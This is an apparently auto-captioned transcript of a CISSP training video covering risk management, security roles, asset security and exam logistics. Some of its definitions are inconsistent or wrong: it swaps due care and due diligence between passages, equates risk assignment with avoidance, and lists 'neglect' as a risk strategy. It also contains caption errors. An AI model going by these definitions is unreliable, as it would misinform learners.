and we compare security to a baseline
for example i've got a firewall that has
been configured in a particular manner
now when i do a vulnerability assessment
on the firewall it the vulnerability
assessment gives me a report that states
that some of the rules may now be
redundant thus allowing access to
unauthorized users this becomes a risk
or this becomes a threat if this threat
is identified by unauthorized people
they would then try to attack this
firewall to gain access to that data
which they are unauthorized to access
thus
leading to losses for an organization
what is the likelihood of this happening
if the likelihood is high
or low that's what the risk management
program is all about right and based on
this risk we implement security controls
we manage the security controls and then
we verify the security controls for
future risks to coming into the picture
it must be defined and it is always
defined as an ongoing project because
risks will always change based on the
businesses based on the security
controls that you have this will give a
guidance to an organization of how
security is being implemented how it has
enhanced over a period of time and how
security mature that organization has
become because of the risk assessment
program it also helps you to satisfy two
aspects due diligence and due care what
is due diligence due diligence is
basically the research that organization
does in identifying those risks and
mitigating them the due care is the
actual part of mitigation where you have
implemented a security control to
mitigate the risk that you have
identified so if companies negligent
that means if the company doesn't have a
risk management program it is not going
to be that security oriented or the
security is not going to be that great
does the company may not comply to laws
regulations and standards thus causing
them penalties lawsuits and other
repetitions in the industry based on
whatever they are doing for risk
management we come to frameworks the
frameworks are used to categorize
information systems so that we can
identify threats or risks based on the
classification so this classification
helps us determine the criticality and
the sensitivity of information system
right so what is the sensitivity and
criticality it basically gives us an
understanding of the value of the asset
that we have so if you go back to domain
one the asset value or the asset
identification asset security that's
where it comes into the picture
obviously a database server is going to
be more secure than an end user laptop
based on the data that they have thus
the criticality of the system for a
database is much higher than the end
user's laptop then we look at the
security controls that can be
implemented then for those the
frameworks like iso 27001 comes into the
picture there is kobe there is there are
a lot of frameworks out there nist 800
then we talk about assessing the
security controls once we have placed
those security controls we need to
verify those controls are placed
properly they actually mitigate the risk
and are appropriate to correctly
mitigate that particular risk that they
are creating then looking at authorizing
information systems grant information
systems operations based on risks
determined so you have identified
address you have authorizing some of
them some of the devices to function in
a particular manner based on which some
of those risks would be mitigated or
would be reduced to an acceptable level
so in the cissp we talk about a lot of
risk assessment strategies we look at
how we can manage risks the four
different types of managing risks would
be
one is to mitigate other is to transfer
the third is to accept it and the fourth
one is to neglect the risk so uh in the
cissp it talks in great details about
those risk assessment strategies we are
talking about the four types of risk
mitigating strategies they are risk
avoiding or avoiding the risks accepting
the risk transferring the risk and
eliminating the risk so
in the course we basically talk about a
lot of risk strategies and how to
mitigate these risks and
how they can be implemented to bring
down to a acceptable level so again just
acceptance risk
appetite of an organization comes into
the picture these terms are then
discussed uh in the training to
understand how the policies would work
around the risk management strategy
moving on then looking at monitoring
security control so once we have
security controls in place we have
assist them we also need to monitor them
for the effectiveness and though they
are going to create any alerts or any
risks are being realized or any new risk
that may be created by the security
control implementation so in these risk
assessment these are the frameworks
these are the steps that we want to
follow to identify mitigate and monitor
these risks so the management begins
with risk assessment what do you mean by
risk assessment identifying the impact
of the risk that the risk would have on
the organization and there would be two
different ways to assess the risk a
quantitative assessment or a qualitative
assessment a quantitative assessment is
more quantifiable or is numerical in in
its process where you're looking at
assigning costs to particular assets and
the threats so the losses that you may
figure out in a risk assessment strategy
would be more numerical where would be
in a currency format where let's say a
risk if realized would lead to a loss of
a extra amount of dollars that's where
the quantitative analysis comes into the
picture the qualitative analysis would
be quality of a service so if a service
is being affected because of a risk what
is the degradation of that service to
what aspect is it getting degraded for
example internet that we use if there is
an internet outage or if there is a
reduction in internet speed right so if
i've got a 10 mbps line and now because
of some fault of the isp it gets reduced
to 4 mbps i may not be able to conduct
the business that i would i was doing on
a 10 mbps line thus the quality of that
device has degraded uh does it is going
does it is a risk and it is causing me
losses right so qualitative risk
analysis would be more descriptive in
nature rather than be numerical in
nature
most of the companies or organizations
would follow a hybrid policy because it
is not possible to have a quantitative
quantitative risk analysis in each and
every scenario new organization which
doesn't have much data to rely on
historical data of how threats have
affected that particular organization
may go in for a qualitative one and as
they mature over time in the security
practices they may then turn over to a
quantitative risk analysis or a hybrid
risk analysis where they're using a
combination of quantitative and
qualitative both thus uh the risk
controls that we were talking about risk
acceptance risk reduction and risk
assignment uh there is risk avoidance as
well so there are four controls the risk
reduction is where you have implemented
a security control
based on which the risk has been reduced
to a more acceptable level risk
assignment is very
also known as risk avoidance that's
where you're avoiding risk by
outsourcing it so talking about risk
controls again the four types being
accept avoid transfer and reduce risk
acceptance is where
your the organization is willingly
accepting the risk as the way it is
because they don't want to deal with it
right now they might deal it with it in
the next iteration or it doesn't it is
at an acceptable level and the company
just wants to move on avoiding the risk
is where you are going to try to not use
the service where the risk exists thus
avoiding is where you have identified a
particular service where the risk exists
and now you're not using the service to
avoid the risk altogether risk
limitation or risk reduction would be
where you are implementing a security
control to mitigate the risk and then
risk transference is where risk
assignment comes into the picture where
you are transferring it to a third party
like outsourcing it by using insurance
to limit the risk so for example the
threat is of a fire the risk is high but
you cannot do anything about it so you
purchase insurance so if the fire
actually happens you would still be
reimbursed for the losses that you have
faced coming back to counter measures we
have discussed administrative uh
countermeasures these are policies rules
regulations laws customs that a company
needs to adhere to based on the industry
that they are in then there are
technical controls software controls
anything that is technical in nature ids
ips firewalls encryption anything that
is going to help you implement the cia
and then physical where you would look
at
locks on those security guards at
offenses
where they're preventing access to
unauthorized people let's talk about
roles and responsibilities of management
now as far as management is concerned or
the hierarchy is concerned uh you can
see on the screen there's a senior
management the security professional
data owner custodian and user now these
are from exam perspective from the
certification perspective obviously the
hierarchy and organization would be
slightly different but here the senior
management is the responsible party for
the entire security mechanism so they
must drive the entire security pro exam
so cissp talks about a top-down approach
where the senior management has realized
the importance of security and is
implementing at all levels within the
organization thus they are a part of it
and they are supporting the security
program they define the tolerance of
risk of how much risk is stopping to be
tolerated by an organization from a
monetary perspective or the qualitative
perspective as well depending on the
laws legislations regulations
compliances and the contracts the
business has signed they will rely on
security professionals to manage the
risk but the exercise and the management
process has to be defined by the senior
management once the security team comes
up with the counter measures the senior
management either approves or
disapproves them
based on the return on investment of
that counter measure the security
professional assist with the development
of policy documents gives their input
because they are the people who are in
the day-to-day process of dealing with
these thus they can identify gaps and
give
good inputs to modify or to create the
policy in a more robust manner the
security professionals may be a part of
the risk assessment and risk management
team as well especially the security
technical aspects of it assist with the
implementation and maintenance of
countermeasures so the administrative
technical or physical measures that you
have identified you may be requested to
implement that for example
the locks that we have on the door the
swipe locks they are connected to a
database where the database is
maintained so as a security professional
you wouldn't be responsible to fit those
locks but to create the database manage
and maintain the database where that
information is kept upon where people
are authorized and authenticated and
would be responsible for monitoring
auditing and security assessments as
well the data owner the owner of that
particular data part
would normally be the head of the
department for example the sales data is
normally owned by the director of sales
of that department so that they would be
ultimately responsible for identifying
the data classifying that data and
accepting the security controls that are
implemented they may request for
additional security controls if they
deem fit the security professional
implements the security controls then
the custodian a person who is
responsible for implementing the
approved security controls or managing
the day-to-day activity of the security
controls for example the security
professional has identified an access
control to be implemented on a data set
that the data owner owns the data owner
has approved of it it is the custodian
who is going to implement that strategy
or implement the control uh on it the
user is basically the user who or the
person who accesses the information and
id resources does whatever access
controls have been implemented would
identify the user authenticate authorize
them and help them accountable for
whatever they are doing if the user is
unable to authenticate access would be
denied in this video we will focus on
the second domain of cisp which is asset
security so let's understand the need
for asset security through a small
scenario well it was yet another regular
day in tim's organization everything was
going on fine until the organization
faced a cyber attack the hacker hacked
all the servers in tim's organization
the organization had loads of data not
all of the data had the same level of
protection the level of protection
varied from one piece of information to
another in this scenario the hacker
could hack into only that particular
data which was less protected however
this cyber attack had a huge impact on
the organization in addition to this it
was also discovered that there was some
flaw in the information classification
process that exposed even sensitive data
to a cyber attack in other words even
crucial data was left with very less
protection this gave rise to asset
security asset security is defined as
the process of collecting and protecting
assets such as data and devices asset
security helps an organization
understand and classify data with
respect to its importance which in turn
makes sure that highly valuable data
receives the most protection
asset security achieves its goals
through its domains the domains are
information classification then we have
data classification data lifecycle data
remnants and finally we have data loss
prevention each of these domains have
different goals all of these domains
together make up asset security now
let's have a look at each of these
domains individually first up we have
information classification as you saw
what happened in tim's organization it
is understood that importance of data
varies largely we have to classify data
before we can move on to protecting it
we need to be able to identify which is
the most crucial data with respect to
organizations information classification
is defined as the process of segregating
data based on its importance to provide
adequate level of protection to every
piece of data information classification
is different for each sector based on
their objectives the classification
varies in the general sector information
classification is used to minimize risks
on crucial information whereas in the
government or military sector it is used
to prevent unauthorized taxes and
finally in the commercial sector it is
used to keep sensitive information
private here it is seen to it that
information is not disclosed to a
company's competitors let's now move on
to our second domain that is data
classification as the name suggests here
data is basically classified based on a
set of considerations here we will look
into factors like data retention
requirements then data security
requirements data disposal methods data
encryption requirements and finally
compliance requirements so these are the
factors which are taken into
consideration while classifying data
this entire process of data
classification is taken care of by the
data owner in addition to the
classification they also analyze the use
and value of the available data to the
company finally the data owner also
annually reviews the data classification
before classifying data an important
step is to understand the data life
cycle all of us speak of data all the
time however do we know the various
steps a piece of data goes through well
for that let us have a look at the third
domain data lifecycle we will start off
from the data creation step and
understand what happens to the data
after that as you see on your screens we
have six steps in the data lifecycle
stage they are create store use
share archive and destroy starting off
with the create phase this is the first
step in data lifecycle here new data is
generated or the existing data is
updated
after the data is created we use data
repositories to store the created data
without storing data we cannot derive
any information from it hence this step
is very crucial in the third phase data
is viewed or used in some application or
processed in addition to data being
viewed and processed it is also shared
between various users and customers our
fifth face is archive here data which is
not used frequently that is inactive
data is identified and then moved into
long-term storage systems and finally we
have the destroy phase as the name
suggests data is simply destroyed here
data can be destroyed either digitally
or physically not to forget you cannot
simply destroy data it should be done
based on regulations but have you
wondered what happens if data is not
destroyed even after we try our best to
erase it well this gives rise to data
remnants in simple words data remnants
is a term used for the residual of
digital data which remains even after
attempting to erase that particular data
data remnants should be avoided as it is
not good to have remains of a piece of
data which was intended to be destroyed
security professionals should be well
versed with techniques to avoid data
remnants so how do we tackle data
remnants for this we have various
methods they are purging clearing
overwriting degaussing storing and
finally destruction let's have a look at
each of these methods individually and
understand how they help in tackling
data remnants
first up we have purging purging is done
to minimize risks on crucial information
in clearing data from storage devices
are removed however it can be
reconstructed by using various softwares
third we have overwriting here we write
over the original data several times so
that the original data cannot be
recovered decausing is the method used
to destroy data on magnetic storage
tapes next up we have storing before
storing data on media the data is
encrypted for the purpose of safety
finally the sixth method is destruction
here storage device which hold the data
are physically damaged incineration
crushing and shredding a few of the
methods used for destruction now let's
move on to our fifth domain data loss
prevention in this domain various
security measures are adopted that will
help in making data available to only
the authorized users here we will look
into four of such measures the first
measure is data inventory in this step
data is identified and then classified
in the second step the data flow is
plotted over the life cycle the third
measure is data protection strategy here
a number of risk assessments are
performed the fourth measure is
implementation in this step we take up
cases which have had a history of data
loss for testing purpose those were the
five domains under asset security in
addition to these it is also required
that we understand the term privacy with
respect to asset security privacy is a
very crucial aspect when it comes to
western security information privacy and
data privacy are more or less the same
this term is used to differentiate one
person from another it relates to the
personal data stored on computers so
what kind of data falls under this
category well we have data such as
medical records office data financial
data etc which fall under this category
to uphold privacy we use technologies
like pseudonymization tokenization and
anonymization well pseudonymization
refers to a data management process
anonymization refers to a process of
either encrypting or removing personally
identifiable data so that people who the
data describes remain anonymous and
finally in tokenization a sensitive
piece of data is substituted with a
non-sensitive equivalent in this video
we are going to discuss the cissp exam
and its questions what is cissp
cissp stands for the certified
information security or rather certified
information system security professional
it is considered as a cool standard in
the field of information security it is
a management certification so when you
are in the senior management this is the
kind of certifications that you would
require for your
management skills now this is a
non-technical or a semi-technical
certification here it's nothing about
vulnerability assessment or penetration
testing you're not going to do anything
hands-on you are not expected to know
hacking or you are not expected to know
how to configure firewalls anti-viruses
and whatnot it's basically something
that over a period of years of
experience you have evolved a certain
understanding of how security policies
should be constructed how they should be
implemented and how security affects an
organization so here you are responsible
to create a overall security policy for
an organization to help maintain the
security posture of an organization now
as far as the certification is concerned
it has a validity of three years after
which you don't have to give the exam
again however during these three years
you have to earn a certain point so it
is known as a continuing education
points that isc square allows you to
generate points by attending lectures or
by attending webinars by publishing
white papers by providing trainings
obviously all of these should be
authorized and you should have a
validation from a authorized party that
you have done this activity once it is
verified you will be awarded certain
points once you have collected
sufficient for a number of points you
will retain your certification beyond
three years the passing rate of this
exam is less than 50 percent so it's not
how much you require to score what this
basically tells you is the amount of
people who actually clear the exam in
the first attempt now let's not get
disheartened because of this
essentially the exam is quite tough it's
known as a mild white and inch deep exam
that means you need to know just about
everything and anything that is there to
be known in information security and
that's something that we are going to
discuss when we go into the eight
domains of cissp what happens is there
are a lot of people who are not actually
prepared for the exam who think they are
prepared attempt the exam and sadly fail
in their first attempts some people just
misjudged the exam and not
prepared for it so the fact that i'm
trying to put across is be very well
prepared i have seen people who study
for months together attempt a lot of
questions ensure that their knowledge is
up to the mark and only then do they
attempt the exam anybody can register
for the exam to be honest and clear the
exam as well however to get certified
there are two different avenues so if
you have a experience of at least five
years in two of the domains that are in
the cissp course you get certified so
even if you clear the exam there is a
validation process that happens after
the exam where you have to submit
documentation to prove to isc square
that you have that level of experience
and once it is pro proven and validated
you get certified as a cissp if you do
not have that five years of experience
you get certified as an associate of iic
square for cissp and they give you six
years during which you can achieve the
level of experience prove it to them and
then get certified as a cissp so you can
see the stringent levels that are taken
for this certification the validation is
basically documentation and proof that
you have to submit and which is verified
so even after you clear an exam to get
validated and get certified it can take
up to five to six weeks for isc square
to validate and provide you with the
certification with that let's go and see
the exam let's have an overview of what
the exam is all about the governing
bodies isc square that's what we have
been referring to and the professional
experience at least four years of
college degree or additional credentials
from isc squares approved list that will
satisfy one year of required experience
and five years of paid full-time work
experience in two or more domains like i
said anybody can give the exam register
for it attempt it once you clear then
that's where the criteria of your work
experience comes into the picture you
prove five years of experience probably
by a letter from your organization from
your hr saying you have this kind of
experience that is relevant to the
certification the iss square will
validate it you get the certification if
you don't have that experience you get
associate of ic square and then you get
six years to attain that level of
experience after which you can get
certified the exam fees what 699
so it's an expensive exam a single
attempt for each voucher so if you fail
that's another 700 for the second
attempt the fact being if you fail for
the first time you cannot attempt the
exam for the next 30 days if you fail
for the second time you cannot attempt
the exam again for the next 60 days and
if you fail for the third time you
cannot attempt the exam for another 90
days so there's a cooling off period
after each attempt so i would suggest
study hard go for the first attempt
clear it and nail it the maintenance
fees for your certification is again 85
us dollars for three years the exam
length is three hours and the questions
could vary from 100 to 150 150 being the
max questions that can be asked in that
exam you can clear the exam well before
150 questions so be prepared for that as
well but imagine when you're walking
into that exam bear in mind that you
will be asked 150 questions and you have
to time those in three hours 180 minutes
that's what three hours is so if you do
the math not much time for every
question so it's just a minute and a
half or less than that for each question
and the questions could be very
descriptive could be confusing so you
have to have your mental faculties
really strong during the exam the
passing score is 700 out of a possible
1000 points exam language is english
testing centers there are isc square
authorized centers where you need to
book that exam there's a huge process
that you have to follow to where you go
for the exam itself so once you have
registered on the isc square portal and
you purchase the voucher they will give
you a list of centers in your vicinity
that you can look into they'll give you
a calendar to give you the possible
dates that you can attempt the exam on
select the sender select the date reach
the center at least half an hour before
the scheduled time there is a
verification so you have to carry your
identification a government issued
document either a passport driver's
license where you have to prove that you
are who you say you are and once the
verification is done only then do you
get to attempt the exam the question
formats are three types multiple choice
drag and drop and hotspots multiple
choice is the format that we are going
to look at when we look at sample
questions it's the same they give you a
question they give you four options
either one or more options need to be
chosen they will specify if there is
more than one answer to that particular
question in a drag and drop it's most
like uh more like match the following so
there will be a column a and column b
and uh they'll ask you a question and
say okay column a gives you the options
drag and drop whichever correct answer
is in is from column a to column b and
then submit the answer if the answer is
correct you get awarded the points else
there is no negative marking the third
is a hotspot a hotspot question is
basically a diagram let's say a
architectural diagram that will be
presented to you and they will ask you
to pinpoint a certain aspect within that
diagram for example they may give you an
architectural overview of a network of
how it has been established and they
will ask you for a network-based
firewall which is the most
likeliest area that you want the
firewall to be placed in so you don't
need to know how to configure the
firewall but from an architectural
perspective you need to know where that
firewall needs to be placed for it to be
the most effective for the given
scenario in the question these are the
domains that are asked so you can see it
basically covers anything and everything
that is there in information security it
starts off with security and risk
management which weighs 15
in your questions in your exam so if
your exam is 115 questions fifteen
percent would be around we'll have
around twenty twenty two out questions
and risk management being one of the
most important topics for these kind of
certifications then uh asset security
which covers twenty ten percent of your
questions so that's around fifteen
questions security architecture and
engineering this is where your
infrastructural knowledge uh your
security architecture your enterprise
architecture all those come into the
picture there are a lot of theoretical
models that you need to study in domain
3 and that covers 13 of your exam
communications and network security this
is the most technical topic within all
these eight topics this is where you
talk about networks you talk about tcp
you discuss protocols like tcp udp you
discuss different attacks
man-in-the-middle attacks toss attacks
and this basically has 14 percent of
weightage then you have identity and
access management which basically talks
about users subjects objects subject
being the user object being the resource
and a relationship between these to be
created where people are authorized for
some activity authenticated and only
then allowed and also held account table
for whatever activity they have done
then you go into security assessment and
testing so vulnerability assessments
penetration tests software test testing
sas tasks a little bit all those will be
covered in domain number six which has
12 percent weightage then security
operations so security operation center
or the stock day-to-day management of
incidents so your incident management
would come into the picture problem
management change management all of
those things would come under domain 7
as security operations which has 13 of
weightage and then finally software
development security now you don't need
to know development or you don't need to
know any programming there are no
program based questions they're not
going to ask you how to code they're
going to ask you how to manage a
software development life cycle or a
secure software development cycle so
this is where your waterfall models
modified waterfall models spiral agile
devops devsecops all come into the
picture and this has 10 percent of
weightage now it is near about
impossible for everyone or anyone to get
experience across all these domains so
you will have your strong points and you
will have your weak points the task is
to identify where you're good at
understand those things make the maximum
amount of it then identify your weak
points and start developing on those if
you are able to look at it from a
theoretical perspective however if you
can get an internship or if you can get
a you can say just an insight of how it
works in the practical world it would be
very helpful now that being said as far
as cissp exam is concerned it involves a
very ideal world the real world actually
doesn't come into the question because
the real world will have a lot of
business logic to it by business logic
what do we mean every organization will
modify
their projects based on the expertise
that they have based on the talent that
they have and based on the people
or the hierarchy of the organization
that has been established so it can be
customized to each and every
organization since an exam cannot deal
with these kind of customizations we
deal with an ideal world so for the
cissp exam we assume that we have all
the resources we have all the people
that are required we have an hierarchy
in the training which is given out where
we have rules for each and every person
and job titles for each and every person
right so when we go through the training
it is very essential that we understand
what these job roles are what their
responsibilities are so that when we get
those questions we can identify which
person is going to attempt what in the
real world things are very different we
piggyback we take on multiple
responsibilities and that is something
that cissp doesn't adhere to so you have
to be very careful identify the job
rules identify the responsibilities have
that map the hierarchical map created
very well and then try to implement the
ideal world scenario from the cissp
standards to see what is going to happen
that being said let's move on let's
discuss the domains now these domains
we've already seen what we can do is
we're going to move on to the sample
questions for each and every domain once
we reach the domain we'll see what the
topics in that domain are we'll look at
the sample questions then we will look
and go to the next domain see the topics
in that domain and then look at the
sample questions as well so what to
study and those sample questions
revolving them so looking at the first
module or first domain security and risk
management now this is one of the
largest domains that could be
debatable for me i would say the largest
domain could be domain number three
security architecture and engineering uh
could also be domain number four because
it is quite technical communications and
network security and could also be
security operations because that's
incident management change management
problem management all together but each
domain is very important from the exam's
perspective if you're thinking about
keeping a domain for options forget it
that's not the right way to address the
exam let's start off with the first one
security and risk management this domain
teaches you all about information
systems management and this talks about
risks and everything so what we are
going to do is we are just going to go
to the official document from iic square
where these domains and their topics are
given so that's the exam outline from
cis from ic square towards cissp this is
the latest document that is there
available online you can see the url in
my browser address bar and these are the
eight domains there's the exam three
hours number of questions 100 to 150
multiple choice and advanced innovative
questions that's where the drag and drop
and the hotspot comes into the picture
though based on experience i can tell
you that 90 percent of your questions
will be multiple choice 10 would either
be drag and drop and hotspots passing
grade is 700 out of a thousand points
exam language availability is english
those who want to attempt in other
languages it is available but then the
exam is six hours and the questions are
250. so that's your option depending on
which language you are most comfortable
with we are going to go with english
that's the language options coming in
cisp union exam 6 hours 250 questions
everything else remains the
same these are the languages supported
french german brazilian portuguese
spanish japanese simplified chinese and
korean the weightage i guess remains the
same and that's the first domain
security and risk management so what
does it pertain to understand and apply
concepts of cia confidentiality
integrity and availability in the first
video we have gone through
all the eight domains at quite some
length we have discussed what cia is all
about and how their interrelationship is
so if you want a deep dive or rather a
deeper dive than what we are doing for
the domains go back to the first video
uh look into that and then you can come
back to this video again so evaluate and
apply security governance principles so
we have to understand what governance is
now governance is basically having a
overlying architectural security policy
that can be integrated with an
enterprise architecture and thus having
your security policy in alignment with
the business goals and objectives
security should never become a hindrance
for a business security should always
become a supporting feature which should
allow the business to be executed in a
secure manner so as a security expert
our first goal is to identify what the
business does what the business
processes are what is the business
trying to achieve and then we try to
create a security policy revolving these
to enhance the business functionality uh
in a overall picture so you're looking
at organizational processes
acquisitions divestitures acquisition is
when let's say scenarios where you have
trying to create a security governance
policy now the business is trying to
change because they're trying to acquire
another organization and merge it within
this organization and now your security
policy should encompass not only your
organization but but the newly acquired
organization let's say the next five
years a business decides that the newly
acquired organization is no longer
profitable and they want to sell it off
and now that's where the diversity comes
into the picture you are now trying to
separate the entity that you have just
integrated in your security policy and
you are now trying to separate it with
confidentiality integrity and
availability of the company's data
intact without affecting the
organization at any point in time
understand the fact that security is not
only about hacking or getting hacked
it's about being secure at all points in
time
during business uh continuity and
business let's say business as usual
kind of activities so that's where your
security control frameworks would come
in you're going to talk about iso 27001
we are going to talk about cobit uh pci
dss nist 800 series and so on so forth
and the most two important statements or
terms in the cissp is due care and due
diligence do you care is you doing your
own research to identify what security
controls need to be implemented or what
kind of governance needs to be
implemented and due diligence is you
yourself spending that much time money
effort into implementing those decisions
that you have come come across during
the due care thus enhancing the security
functions of an organization so when we
talk about business requirements for a
business to be effective at the same
time it needs to be legal it needs to be
compliant to regulations and laws and to
the contracts that have been created by
the organization so as far as the
concept goes when we say that security
needs to be in alignment with the
business requirements the business
requirements imply that the business is
legal is compliant to regulations is
compliant to their contractual
obligations and is following standards
that have been prescribed to them so all
of them come together and that's where
your security mapping comes into the
picture you're looking at legal and
regulatory issues like cyber crimes and
data breaches licensing and intellectual
property requirements and so on so forth
and it will also include ic square's
code of professional ethics now this is
a document apart from the eight domains
that we have talked about thus what does
this document talk about this is the
prescription from iic square of
professional ethics for a cyber security
professional expect around four to five
questions from professional ethics as
well so not only is this a document that
you need to read and adhere to you will
be questioned upon this in your exam and
these are easy points to score
professional ethics something that is
ethical something that is not against
the law so it's kind of quite easy but
the questions can be confusing so you
need to go through the entire document
really well and then your organization
will have its own code of ethics however
if you look at the hierarchy ic squares
ethics comes first so your
organizational ethics should not be
contradictory to ic squares ethics in
the first place then develop document
and implement security policies
standards procedures and guidelines
identify analyze and prioritize business
continuity requirements so here that's
where your risk assessment comes into
the picture if you're looking at a
particular risk that means a particular
vulnerability has been identified you
want to
see the likelihood of that vulnerability
being exploited and then the business
impact analysis that it may have based
on which you would then create a plan to
mitigate that particular risk by having
a business continuity or a disaster
recovery plan coming into the picture
now this is as far as this domain is
concerned you're calculating the risk it
doesn't actually tell you how to
mitigate that risk that's when you go
into the next future domains and discuss
those technicalities so you can see uh
contribute and enforce personnel
security policies now the thing about
cissp is physical security also comes
into the picture why because if uh
hardware is not well protected there
would be physical attacks social
engineering attacks that could be
created which would lead to uh data
leakage as well and the first and the
foremost most valuable asset of an
organization is always human personnel
so cissp would also deal with people
protection in the first place for
example protecting people against social
engineering attacks making them aware
about these attacks if there are natural
calamities you have to plan a plan for
them during your disaster recovery and
business continuity plan and ensure that
people are safeguarded not only that you
have to tie these things up with
identity and access management for
example account creation account
management onboarding of employees
off-boarding termination of employees
third-party contractors consultants that
you're going to hire which are not
employees but third parties coming in to
your organization providing intelligence
and so on so forth so all of those come
into the picture as well and then that's
where your risk of management concepts
come in it gives you a very good
overview of how to identify those risks
and so on so forth now this is what the
in the first domain is all about itself
is very huge and as we go ahead we can
tie this domain to the rest of the
domain with that we have reached the end
of day three of our cyber security week
on day four we are going to focus on the
important ethical hacking and cyber
security interview questions thank you
all for watching today's live session i
hope it was useful and interesting
thanks again and see you tomorrow
hi there if you like this video
subscribe to the simply learn youtube
channel and click here to watch similar
videos to nerd up and get certified
click here